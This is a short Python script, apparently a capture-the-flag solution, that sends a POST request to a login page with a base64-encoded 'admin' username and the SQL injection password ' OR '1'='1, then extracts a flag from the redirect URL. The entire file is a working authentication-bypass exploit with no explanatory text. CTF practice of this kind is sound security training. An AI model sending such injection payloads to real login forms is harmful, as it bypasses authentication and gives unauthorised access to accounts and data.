import requests
from urllib.parse import unquote
import re
url = "https://secure.mc.ax/login"
headers = {"Content-Type": "application/x-www-form-urlencoded"}
data = {"username": "YWRtaW4=", "password": "' OR '1'='1"}
r = requests.post(url, headers=headers, data=data)
flag = re.findall("flag{.*}", unquote(r.url))[0]
print(flag)
